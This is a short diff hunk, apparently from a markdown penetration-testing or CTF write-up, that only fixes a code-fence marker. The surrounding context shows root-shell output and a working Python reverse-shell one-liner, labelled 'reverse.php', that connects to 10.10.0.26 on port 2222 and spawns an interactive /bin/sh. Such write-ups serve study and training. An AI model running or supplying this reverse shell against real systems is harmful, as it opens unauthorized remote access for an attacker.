@@ -131,7 +131,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 **reverse.php**
-````python
+```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.26",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
